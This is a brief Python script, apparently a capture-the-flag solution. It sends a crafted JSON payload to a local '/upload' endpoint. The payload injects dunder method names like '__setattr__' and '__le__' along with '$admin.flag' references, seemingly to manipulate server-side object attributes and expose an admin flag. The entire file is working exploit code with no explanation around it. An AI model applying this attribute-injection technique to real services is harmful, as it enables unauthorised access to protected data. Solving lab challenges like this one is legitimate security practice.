import requests



PAYLOAD = {
    "queries": [
        {
            "name": "$__setattr__",
            "file_name": "operations",
            "data": "$admin.flag"
        },
        {
            "name": "__le__",
            "file_name": "$admin.flag",
            "data": "123"
        }
    ],
    "a":{
        "operations": {
            "r":''
        }
    }
}
ENDPOINT = "http://localhost:8080/upload"

def main():
    requests.post(ENDPOINT, json=PAYLOAD)

if __name__ == "__main__":
    main()